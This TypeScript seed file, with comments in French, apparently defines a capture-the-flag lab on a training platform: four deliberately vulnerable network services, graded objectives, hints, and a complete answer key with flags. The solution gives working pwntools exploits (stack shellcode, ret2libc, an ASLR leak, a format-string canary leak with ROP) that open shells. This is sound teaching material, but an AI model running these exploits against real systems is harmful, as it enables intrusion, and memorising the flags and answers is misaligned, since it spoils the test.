import type { ProjectSeed } from "../../types";

/**
 * Opération Overflow — 4e projet du checkpoint « cybersecurité — projets ».
 *
 * Exploitation binaire (mémoire) contre un service réseau interne décliné en 4
 * versions, chacune ajoutant UNE protection mémoire. Le joueur réutilise à
 * chaque niveau la technique apprise pour contourner la protection suivante :
 *   niveau 1 : AUCUNE protection      → shellcode sur la pile (ret2reg `jmp rsp`)
 *   niveau 2 : NX                     → ret2libc (ASLR désactivé côté service)
 *   niveau 3 : NX + ASLR              → fuite d'info (cmd DEBUG) → base libc → ret2libc
 *   niveau 4 : NX + ASLR + canari     → format string → fuite canari+libc → ROP
 *
 * Registre technique inédit sur la plateforme : débordement de pile, ret2reg,
 * ret2libc, contournement d'ASLR par fuite d'information, contournement de stack
 * canary, ROP.
 *
 * ── PROPRIÉTÉ CLÉ (validée en amont sur le démon distant) ─────────────────────
 * Chaque service FORKE sans ré-exec : tous ses enfants héritent de la MÊME base
 * libc et du MÊME canari que le parent (fixés à l'exec du parent). Donc une seule
 * fuite casse l'ASLR pour toute la session, le canari fuité reste valide, et le
 * serveur peut publier son canari/sa base dans un fichier/`/proc` relu
 * indépendamment côté serveur (validation `dynamic_text_compare`).
 *
 * ── EXTENSION GÉNÉRIQUE (Partie 0) ────────────────────────────────────────────
 * `TopologyNode.securityOpt` (→ `HostConfig.SecurityOpt`) : les niveaux 1-2
 * tournent sous `setarch -R` (personality ADDR_NO_RANDOMIZE) pour désactiver
 * l'ASLR, ce que le profil seccomp par défaut de Docker bloque. On pose donc
 * `seccomp=unconfined` sur ces nœuds (et sur l'attaquant, pour l'analyse locale).
 * Effet confiné au conteneur JETABLE de la session ; n'atteint jamais la VM hôte.
 * `dynamic_text_compare` est réutilisé tel quel (aucune nouvelle stratégie).
 *
 * ── ADAPTATIONS ASSUMÉES (documentées) ────────────────────────────────────────
 * - Les 4 services partagent UNE image (`project-overflow-vuln`, binaire choisi
 *   par $LEVEL) → économie de disque sur le démon distant.
 * - L'attaquant est DUAL-HOMÉ (external + internal) : ce scénario n'a pas de
 *   firewall/segmentation (ce n'est pas son sujet) ; les deux zones servent
 *   surtout de repère visuel, l'attaquant devant joindre les cibles internes.
 * - `getflag` lit le niveau/suffixe depuis un fichier de session (et non l'env) :
 *   un shellcode execve() met envp=NULL, l'env n'est donc pas fiable côté shell.
 * - Objectifs 6/7 (forensique) : le monitor journalise les CRASH (enfant tué par
 *   SIGSEGV) et les FLAG-READ (shell obtenu → `getflag`). La « vérité » est
 *   CALCULÉE en direct depuis ce journal, jamais codée en dur.
 */

const SLUG = "operation-overflow";

export const overflow: ProjectSeed = {
  slug: SLUG,
  checkpoint: "cybersecurite-projets",
  title: "Opération Overflow",
  description:
    "Exploitation binaire de bout en bout : un même service réseau en 4 versions, chacune durcie d'une protection mémoire supplémentaire (NX, ASLR, stack canary). Du shellcode sur la pile au ROP contre canari, en réutilisant à chaque niveau la technique apprise pour franchir la suivante.",
  difficulty: "insane",
  estimatedMinutes: 100,
  ttlSec: 10800,
  topology: {
    networks: [
      // external : poste d'attaque. internal : les 4 services + le monitor.
      // Les deux en internal:true (labo clos, pas d'accès Internet nécessaire).
      { name: "external", cidr: "10.70.0.0/24", internal: true },
      { name: "internal", cidr: "10.70.1.0/24", internal: true },
    ],
    nodes: [
      {
        id: "attacker",
        image: "cyberace/project-overflow-attacker:latest",
        role: "attacker",
        terminal: true,
        // Dual-homé : « chez lui » en external, mais présent sur internal pour
        // joindre les cibles (pas de firewall dans ce scénario). seccomp=unconfined
        // pour permettre l'analyse locale sous `setarch -R` (ASLR off).
        securityOpt: ["seccomp=unconfined"],
        networks: [
          { name: "external", ip: "10.70.0.10" },
          { name: "internal", ip: "10.70.1.100" },
        ],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 1024, cpu: 1.0 },
      },
      {
        id: "vuln-lvl1",
        image: "cyberace/project-overflow-vuln:latest",
        role: "target",
        terminal: false,
        // Aucune protection : NX off (pile exécutable), non-PIE, pas de canari.
        // setarch -R (→ seccomp=unconfined) pour un environnement déterministe.
        securityOpt: ["seccomp=unconfined"],
        env: { LEVEL: "1", PORT: "9001", SERVICE: "vuln-lvl1" },
        networks: [{ name: "internal", ip: "10.70.1.10" }],
        resources: { memMb: 192, cpu: 0.3 },
      },
      {
        id: "vuln-lvl2",
        image: "cyberace/project-overflow-vuln:latest",
        role: "target",
        terminal: false,
        // NX activé, ASLR désactivé côté service (setarch -R) → ret2libc à base connue.
        securityOpt: ["seccomp=unconfined"],
        env: { LEVEL: "2", PORT: "9002", SERVICE: "vuln-lvl2" },
        networks: [{ name: "internal", ip: "10.70.1.11" }],
        resources: { memMb: 192, cpu: 0.3 },
      },
      {
        id: "vuln-lvl3",
        image: "cyberace/project-overflow-vuln:latest",
        role: "target",
        terminal: false,
        // NX + ASLR activés. Commande DEBUG fuitant une adresse libc.
        env: { LEVEL: "3", PORT: "9003", SERVICE: "vuln-lvl3" },
        networks: [{ name: "internal", ip: "10.70.1.12" }],
        resources: { memMb: 192, cpu: 0.3 },
      },
      {
        id: "vuln-lvl4",
        image: "cyberace/project-overflow-vuln:latest",
        role: "target",
        terminal: false,
        // NX + ASLR + stack canary. Bug de chaîne de format (commande ECHO).
        env: { LEVEL: "4", PORT: "9004", SERVICE: "vuln-lvl4" },
        networks: [{ name: "internal", ip: "10.70.1.13" }],
        resources: { memMb: 192, cpu: 0.3 },
      },
      {
        id: "monitor",
        image: "cyberace/project-overflow-monitor:latest",
        role: "log",
        terminal: true,
        // Collecteur d'évènements (crashs + accès flags) + terminal de consultation.
        networks: [{ name: "internal", ip: "10.70.1.50" }],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 256, cpu: 0.3 },
      },
    ],
  },

  objectives: [
    {
      id: "ov-recon-offset",
      projectSlug: SLUG,
      order: 1,
      kind: "analysis",
      title: "Reconnaissance & offset de débordement",
      description:
        "Depuis le poste d'attaque, inspecte les 4 binaires fournis dans /challenge avec `checksec` : observe la montée en protections (NX, PIE, RELRO, canary) du niveau 1 au niveau 4. Puis, contre vuln-lvl1, trouve l'offset EXACT (en octets) entre le début du tampon vulnérable et l'adresse de retour sauvegardée (un motif cyclique de pwntools le donne). Réponds aussi : quelle protection vuln-lvl4 possède que vuln-lvl1 n'a pas ?",
      points: 100,
      dependsOn: [],
      questions: [
        { id: "offset", prompt: "Offset (octets) jusqu'à l'adresse de retour sauvegardée (vuln-lvl1)" },
        { id: "protection_lvl4", prompt: "Protection présente sur vuln-lvl4 mais absente de vuln-lvl1" },
      ],
      hints: [
        { text: "checksec sur chaque binaire : `checksec --file=/challenge/vuln1` … `vuln4`. Note « No canary found » (niv.1-3) vs « Canary found » (niv.4), et NX disabled/enabled.", cost: 0 },
        { text: "Offset : `cyclic 200` (pwntools) envoyé au service fait crasher l'enfant. Le tampon vulnérable fait 64 octets, plus le RBP sauvegardé (8) → l'adresse de retour est juste après.", cost: 0 },
        { text: "L'offset attendu est 72 (0x48). La protection distinctive du niveau 4 est le stack canary.", cost: 0 },
      ],
      validation: {
        strategy: "text_compare",
        spec: {
          kind: "qa",
          questions: [
            { id: "offset", prompt: "offset", value: "72", accept: ["0x48"] },
            { id: "protection_lvl4", prompt: "protection", value: "canary", accept: ["stack canary", "stack-canary", "canari", "stack protector", "stackcanary"] },
          ],
        },
      },
    },
    {
      id: "ov-lvl1-shellcode",
      projectSlug: SLUG,
      order: 2,
      kind: "attack",
      title: "Niveau 1 — shellcode sur la pile",
      description:
        "vuln-lvl1 n'a AUCUNE protection : pile exécutable (NX off), pas de canari, non-PIE. Écrase l'adresse de retour et exécute un shellcode déposé sur la pile. Astuce robuste : un gadget `jmp rsp` (présent à une adresse FIXE du binaire non-PIE) saute vers le shellcode placé juste après l'adresse de retour — pas besoin de connaître d'adresse de pile. Une fois le shell obtenu (la socket est déjà reliée à stdin/stdout), lance `getflag` et soumets le flag.",
      points: 150,
      dependsOn: ["ov-recon-offset"],
      hints: [
        { text: "`ROPgadget --binary /challenge/vuln1 --only 'jmp' | grep rsp` donne l'adresse du gadget jmp rsp (fixe, non-PIE).", cost: 0 },
        { text: "Charge utile : `b'A'*72 + p64(jmp_rsp) + shellcode`. Shellcode : `asm(shellcraft.amd64.linux.sh())` (pwntools) — la socket est déjà en stdin/stdout côté service.", cost: 0 },
        { text: "Après l'envoi, tape `getflag` dans le shell. Le flag a la forme NOVA{stack0_smashed}_<suffixe de session>.", cost: 0 },
      ],
      validation: {
        strategy: "text_compare",
        spec: { kind: "flag", value: "NOVA{stack0_smashed}_{{SUFFIX}}", caseSensitive: false },
      },
    },
    {
      id: "ov-lvl2-ret2libc",
      projectSlug: SLUG,
      order: 3,
      kind: "attack",
      title: "Niveau 2 — ret2libc contre NX",
      description:
        "vuln-lvl2 active NX : plus de shellcode sur la pile. Mais l'ASLR est désactivé côté service (personality ADDR_NO_RANDOMIZE), donc la base de la libc est FIXE. Construis une chaîne ROP ret2libc qui appelle `system(\"/bin/sh\")` en réutilisant la libc fournie (/challenge/libc.so.6). Récupère le flag avec `getflag`.",
      points: 200,
      dependsOn: ["ov-lvl1-shellcode"],
      hints: [
        { text: "ASLR off = base libc déterministe. Trouve-la en lançant le binaire fourni sous `setarch -R` dans gdb, ou brute quelques pages autour de 0x7ffff7dde000 (la taille d'argv/env décale la base de 1-2 pages).", cost: 0 },
        { text: "Gadgets depuis la libc (ROP(libc)) : `pop rdi; ret`, un `ret` d'alignement (movaps), l'adresse de `system` et de la chaîne \"/bin/sh\". Chaîne : `b'A'*72 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)`.", cost: 0 },
        { text: "Utilise des gadgets EXÉCUTABLES (ROP(libc).find_gadget), pas une recherche brute d'octets (qui peut tomber dans un segment non exécutable). Flag : NOVA{ret2libc_nx}_<suffixe>.", cost: 0 },
      ],
      validation: {
        strategy: "text_compare",
        spec: { kind: "flag", value: "NOVA{ret2libc_nx}_{{SUFFIX}}", caseSensitive: false },
      },
    },
    {
      id: "ov-lvl3-aslr",
      projectSlug: SLUG,
      order: 4,
      kind: "attack",
      title: "Niveau 3 — contournement d'ASLR par fuite d'info",
      description:
        "vuln-lvl3 active l'ASLR EN PLUS de NX : la base libc est désormais aléatoire. Mais la commande de diagnostic `DEBUG` divulgue « par erreur » un pointeur libc (l'adresse de `puts`). Comme le service forke sans ré-exec, cette base reste stable pour toute la session : une seule fuite suffit. Calcule la base libc, refais un ret2libc, récupère le flag. Soumets AUSSI la base libc que tu as calculée (en hexadécimal, sans 0x) : le serveur la revérifie en lisant /proc/<pid>/maps du service.",
      points: 200,
      dependsOn: ["ov-lvl2-ret2libc"],
      questions: [
        { id: "libc_base", prompt: "Base de la libc calculée (hexadécimal, sans 0x, ex. 71a4e2874000)" },
        { id: "flag", prompt: "Flag de vuln-lvl3" },
      ],
      hints: [
        { text: "`echo DEBUG | nc vuln-lvl3 9003` renvoie `[diag] puts=0x…`. base_libc = adresse_puts − offset de puts dans /challenge/libc.so.6 (`libc.sym['puts']`).", cost: 0 },
        { text: "Ensuite, ret2libc identique au niveau 2 mais avec cette base fuitée (l'ASLR ne protège plus rien une fois la base connue).", cost: 0 },
        { text: "Soumets la base au format /proc/maps : minuscules, sans 0x, sans zéros de tête (ex. 71a4e2874000). Flag : NOVA{aslr_info_leak}_<suffixe>.", cost: 0 },
      ],
      validation: {
        strategy: "dynamic_text_compare",
        spec: {
          questions: [
            {
              id: "libc_base",
              node: "vuln-lvl3",
              command: ["sh", "-c", "grep -m1 libc /proc/$(pgrep -o -f /opt/overflow/vuln3)/maps | cut -d- -f1"],
              extract: "([0-9a-f]{6,})",
            },
            {
              id: "flag",
              node: "vuln-lvl3",
              command: ["sh", "-c", ". /run/overflow/session 2>/dev/null; printf 'NOVA{aslr_info_leak}_%s' \"$FLAG_SUFFIX\""],
            },
          ],
        },
      },
    },
    {
      id: "ov-lvl4-canary",
      projectSlug: SLUG,
      order: 5,
      kind: "attack",
      title: "Niveau 4 — contournement de canari + ROP",
      description:
        "vuln-lvl4 ajoute un stack canary. Un bug de chaîne de format (commande `ECHO <texte>`) permet de lire la pile : fuis le canari (à %29$p) et un pointeur libc (à %65$p) pour recalculer la base. Puis déborde en replaçant le BON canari, et enchaîne un ROP `system(\"/bin/sh\")`. Soumets le canari fuité (hex, sans 0x) — le serveur le revérifie contre la valeur réelle du service — et le flag.",
      points: 150,
      dependsOn: ["ov-lvl3-aslr"],
      questions: [
        { id: "canary", prompt: "Valeur du canari fuité (hexadécimal, sans 0x)" },
        { id: "flag", prompt: "Flag de vuln-lvl4" },
      ],
      hints: [
        { text: "`printf 'ECHO C=%29$p L=%65$p\\n' | nc vuln-lvl4 9004` : C = canari (finit par 00), L = pointeur libc (base = L − 0x2724a pour cette libc).", cost: 0 },
        { text: "Le canari est en offset 72 (juste après le tampon de 64 + 8). Charge utile : `b'A'*72 + p64(canary) + b'B'*8 + rop_system`. Le canari doit être EXACT ou le service abandonne (SIGABRT).", cost: 0 },
        { text: "ROP identique aux niveaux 2/3 avec la base recalculée. Soumets le canari en minuscules sans 0x. Flag : NOVA{canary_and_rop}_<suffixe>.", cost: 0 },
      ],
      validation: {
        strategy: "dynamic_text_compare",
        spec: {
          questions: [
            {
              id: "canary",
              node: "vuln-lvl4",
              command: ["sh", "-c", "cat /run/overflow/canary"],
              extract: "([0-9a-f]{6,})",
            },
            {
              id: "flag",
              node: "vuln-lvl4",
              command: ["sh", "-c", ". /run/overflow/session 2>/dev/null; printf 'NOVA{canary_and_rop}_%s' \"$FLAG_SUFFIX\""],
            },
          ],
        },
      },
    },
    {
      id: "ov-forensics",
      projectSlug: SLUG,
      order: 6,
      kind: "analysis",
      title: "Forensique des crashs",
      description:
        "Endosse le rôle du défenseur. Le monitor a journalisé chaque crash (enfant tué par SIGSEGV) et chaque flag récupéré. Depuis son terminal, lis /var/log/overflow/events.log et réponds : combien de crashs ont été enregistrés sur vuln-lvl1, et à quel horodatage (UTC ISO) le PREMIER shell (FLAG-READ) a été obtenu sur vuln-lvl4 ?",
      points: 100,
      dependsOn: ["ov-lvl4-canary"],
      questions: [
        { id: "crashes_lvl1", prompt: "Nombre de crashs enregistrés sur vuln-lvl1" },
        { id: "first_shell_lvl4", prompt: "Horodatage (UTC ISO) du premier FLAG-READ sur vuln-lvl4" },
      ],
      hints: [
        { text: "Terminal du monitor : `grep -c 'vuln-lvl1 CRASH' /var/log/overflow/events.log`.", cost: 0 },
        { text: "`grep -m1 'vuln-lvl4 FLAG-READ' /var/log/overflow/events.log` — le 1er champ est l'horodatage à recopier tel quel (ex. 2026-07-18T23:24:42Z).", cost: 0 },
      ],
      validation: {
        strategy: "dynamic_text_compare",
        spec: {
          questions: [
            {
              id: "crashes_lvl1",
              node: "monitor",
              command: ["sh", "-c", "grep -c 'vuln-lvl1 CRASH' /var/log/overflow/events.log || true"],
              extract: "(\\d+)",
            },
            {
              id: "first_shell_lvl4",
              node: "monitor",
              command: ["sh", "-c", "grep -m1 'vuln-lvl4 FLAG-READ' /var/log/overflow/events.log | cut -d' ' -f1"],
              extract: "(\\S+)",
            },
          ],
        },
      },
    },
    {
      id: "ov-stealth",
      projectSlug: SLUG,
      order: 7,
      kind: "attack",
      title: "Bonus — discrétion",
      description:
        "Une exploitation soignée ne fait pas de bruit. Prouve que tu as obtenu le shell final sur vuln-lvl4 en provoquant MOINS DE 2 crashs sur ce service avant le succès (fuite propre du canari plutôt que brute-force, offset déterminé sur le binaire local). Le monitor tranche à partir de son journal.",
      points: 50,
      dependsOn: ["ov-lvl4-canary"],
      hints: [
        { text: "Un brute-force du canari ferait exploser les crashs (chaque mauvaise valeur = SIGABRT loggé). Fuis-le proprement via la chaîne de format.", cost: 0 },
        { text: "Détermine l'offset de débordement sur ta COPIE locale (/challenge/vuln4) dans gdb, pas en faisant crasher la cible en boucle.", cost: 0 },
      ],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "monitor",
          command: [
            "sh",
            "-c",
            "awk '/vuln-lvl4 CRASH/{c++} /vuln-lvl4 FLAG-READ/{ if(c<2) print \"STEALTH-OK\"; else print \"STEALTH-NO\"; exit }' /var/log/overflow/events.log",
          ],
          expectedContains: "STEALTH-OK",
        },
      },
    },
  ],

  // Corrigé complet (Partie 4) — auto-révélé à la complétion ou à l'expiration.
  solution: {
    summary:
      "Escalade pédagogique à travers 4 protections mémoire. (1) Sans protection, un shellcode sur la pile via un gadget jmp rsp suffit. (2) NX interdit le code sur la pile → on réutilise la libc (ret2libc) ; l'ASLR étant désactivé, sa base est connue. (3) L'ASLR activé impose une FUITE d'information pour retrouver la base libc — un seul leak suffit car le serveur forke sans ré-exec. (4) Le stack canary impose de le FUIR (chaîne de format) avant de déborder, puis de faire du ROP. Chaque protection ne fait que RELEVER le coût de l'exploitation ; combinées et complétées (PIE/CFI/FORTIFY) elles le rendent bien plus difficile — d'où l'intérêt de toutes les activer.",
    steps: [
      {
        objectiveId: "ov-recon-offset",
        explanation:
          "checksec révèle la posture de sécurité d'un binaire. Ici la progression est nette : niveau 1 sans rien (NX disabled, No canary, No PIE), jusqu'au niveau 4 avec canari. L'offset de débordement se trouve avec un motif cyclique (De Bruijn) : on envoie `cyclic(200)`, le service crashe, et la valeur trouvée dans le registre de retour (via le core/gdb) donne l'offset. Le tampon vulnérable fait 64 octets, +8 pour le RBP sauvegardé → 72 jusqu'à l'adresse de retour.",
        commands: [
          "for b in 1 2 3 4; do echo == vuln$b ==; checksec --file=/challenge/vuln$b; done",
          "gdb -q /challenge/vuln1   # GEF ; pattern create 200 ; run ; (crash) ; pattern search $rsp",
          "# → offset = 72 (0x48).  Protection distinctive du niveau 4 : stack canary.",
        ],
        expectedLogs: "checksec : « No canary found » (niv.1-3) vs « Canary found » (niv.4) ; « NX disabled » (niv.1) vs « NX enabled » (niv.2-4).",
      },
      {
        objectiveId: "ov-lvl1-shellcode",
        explanation:
          "Sans NX, la pile est exécutable : on peut y déposer du shellcode et y sauter. Plutôt que de deviner une adresse de pile (fragile), on utilise un gadget `jmp rsp` à une adresse FIXE (binaire non-PIE) : après le `ret`, RSP pointe juste après l'adresse de retour écrasée, donc `jmp rsp` exécute le shellcode qu'on y a placé. Technique « ret2reg », robuste vis-à-vis de l'ASLR de pile. Le service ayant relié la socket à stdin/stdout, un simple execve(\"/bin/sh\") donne un shell interactif.",
        commands: [
          "from pwn import *",
          "context.arch='amd64'; e=ELF('/challenge/vuln1')",
          "jmp_rsp=next(e.search(asm('jmp rsp')))            # adresse fixe (non-PIE)",
          "io=remote('vuln-lvl1',9001); io.recvuntil(b\"l'aide.\\n\")",
          "io.send(b'A'*72 + p64(jmp_rsp) + asm(shellcraft.amd64.linux.sh()))",
          "io.sendline(b'getflag'); print(io.recvall(timeout=2))   # NOVA{stack0_smashed}_<suffixe>",
        ],
        expectedLogs: "Le monitor journalise « vuln-lvl1 FLAG-READ » à l'exécution de getflag.",
      },
      {
        objectiveId: "ov-lvl2-ret2libc",
        explanation:
          "NX (No-eXecute) marque la pile non exécutable : le shellcode n'y tourne plus. On REUTILISE alors du code déjà exécutable — la libc — c'est le ret2libc : on enchaîne `pop rdi; ret` (met l'adresse de \"/bin/sh\" dans RDI) puis `system`. L'ASLR étant désactivé côté service (setarch -R), la base libc est déterministe ; on la retrouve en lançant le binaire fourni sous `setarch -R`. Un `ret` d'alignement est ajouté car `system` contient une instruction `movaps` exigeant une pile alignée sur 16 octets.",
        commands: [
          "libc=ELF('/challenge/libc.so.6'); rop=ROP(libc)",
          "pop_rdi=rop.find_gadget(['pop rdi','ret'])[0]; ret=rop.find_gadget(['ret'])[0]",
          "binsh=next(libc.search(b'/bin/sh\\x00')); system=libc.sym['system']",
          "base=0x7ffff7dde000   # base ASLR-off (brute ± quelques pages si besoin)",
          "io=remote('vuln-lvl2',9002); io.recvuntil(b\"l'aide.\\n\")",
          "io.send(b'A'*72 + p64(base+ret)+p64(base+pop_rdi)+p64(base+binsh)+p64(base+system))",
          "io.sendline(b'getflag')   # NOVA{ret2libc_nx}_<suffixe>",
        ],
        expectedLogs: "Piège classique : une recherche brute d'octets `pop rdi; ret` peut tomber dans un segment NON exécutable → utiliser ROP(libc).find_gadget.",
      },
      {
        objectiveId: "ov-lvl3-aslr",
        explanation:
          "L'ASLR randomise la base de la libc à chaque exécution : les adresses codées en dur du niveau 2 ne marchent plus. La parade universelle est la FUITE D'INFORMATION : n'importe quel pointeur libre divulgué permet de recalculer la base (adresse_fuitée − offset_connu_du_symbole). Ici la commande DEBUG divulgue l'adresse de `puts`. Comme le service forke sans ré-exec, la base est la MÊME pour tous les enfants → une seule fuite suffit pour toute la session. On refait ensuite le ret2libc du niveau 2 avec cette base.",
        commands: [
          "io=remote('vuln-lvl3',9003); io.recvuntil(b\"l'aide.\\n\")",
          "io.sendline(b'DEBUG'); leak=int(io.recvline_contains(b'puts=').split(b'puts=')[1],16)",
          "base=leak - libc.sym['puts']            # base libc réelle de la session",
          "io2=remote('vuln-lvl3',9003); io2.recvuntil(b\"l'aide.\\n\")",
          "io2.send(b'A'*72 + p64(base+ret)+p64(base+pop_rdi)+p64(base+binsh)+p64(base+system))",
          "io2.sendline(b'getflag')   # NOVA{aslr_info_leak}_<suffixe> ; soumettre aussi base en hex sans 0x",
        ],
        expectedLogs: "La validation relit /proc/<pid>/maps du service et confirme que la base soumise correspond (relecture indépendante côté serveur).",
      },
      {
        objectiveId: "ov-lvl4-canary",
        explanation:
          "Le stack canary place une valeur secrète entre les variables locales et l'adresse de retour ; si un débordement l'altère, le programme avorte (SIGABRT) avant de retourner. Pour déborder quand même, il faut d'abord CONNAÎTRE le canari. Un bug de chaîne de format (printf sur une entrée contrôlée) permet de lire la pile : on y trouve le canari et un pointeur libc. On reconstruit alors une charge qui REPLACE le canari intact, puis (NX oblige) on fait du ROP system(\"/bin/sh\"). Le canari est per-processus mais hérité par les enfants → stable sur la session.",
        commands: [
          "io=remote('vuln-lvl4',9004); io.recvuntil(b\"l'aide.\\n\")",
          "io.sendline(b'ECHO C=%29$p L=%65$p')",
          "l=io.recvline_contains(b'C=0x'); canary=int(l.split(b'C=')[1][:18],16); libc_ptr=int(l.split(b'L=')[1],16)",
          "base=libc_ptr - 0x2724a          # offset du pointeur libc fuité",
          "io2=remote('vuln-lvl4',9004); io2.recvuntil(b\"l'aide.\\n\")",
          "io2.send(b'A'*72 + p64(canary) + b'B'*8 + p64(base+ret)+p64(base+pop_rdi)+p64(base+binsh)+p64(base+system))",
          "io2.sendline(b'getflag')   # NOVA{canary_and_rop}_<suffixe> ; soumettre aussi le canari en hex sans 0x",
        ],
        expectedLogs: "La validation compare le canari soumis à /run/overflow/canary (valeur réelle du service, publiée au démarrage). Mauvais offset/canari → SIGABRT loggé comme CRASH.",
      },
      {
        objectiveId: "ov-forensics",
        explanation:
          "Côté défense, la télémétrie d'exécution raconte l'attaque. Chaque enfant tué par SIGSEGV (tentative ratée) et chaque exécution de getflag (compromission réussie) sont horodatés par le monitor. Compter les crashs par service révèle les phases de tâtonnement (recherche d'offset, brute-force) ; l'horodatage du premier shell date la compromission. Leçon : instrumenter les services (crashs, exécutions anormales de /bin/sh) est la base de la détection d'exploitation mémoire.",
        commands: [
          "# terminal du monitor",
          "grep -c 'vuln-lvl1 CRASH' /var/log/overflow/events.log      # nombre de crashs niv.1",
          "grep -m1 'vuln-lvl4 FLAG-READ' /var/log/overflow/events.log # 1er champ = horodatage du 1er shell niv.4",
        ],
        expectedLogs: "Format : « <UTC ISO>  <service>  CRASH|FLAG-READ ». Recopier l'horodatage exactement.",
      },
      {
        objectiveId: "ov-stealth",
        explanation:
          "Une exploitation mature est furtive : elle évite les crashs répétés qui déclenchent alertes et redémarrages. Sur le niveau 4, brute-forcer le canari (256^8 essais) est à la fois voué à l'échec et bruyant ; la bonne approche — fuir le canari par la chaîne de format et déterminer l'offset sur le binaire local — n'entraîne aucun crash avant le succès. La validation confirme moins de 2 crashs sur vuln-lvl4 avant le premier FLAG-READ.",
        commands: [
          "# aucune commande spécifique : conséquence d'une exploitation propre du niveau 4",
          "# (fuite du canari via ECHO %29$p, offset trouvé sur /challenge/vuln4 en local)",
        ],
        expectedLogs: "Le monitor compte les CRASH de vuln-lvl4 précédant le premier FLAG-READ : < 2 → STEALTH-OK.",
      },
    ],
  },
};
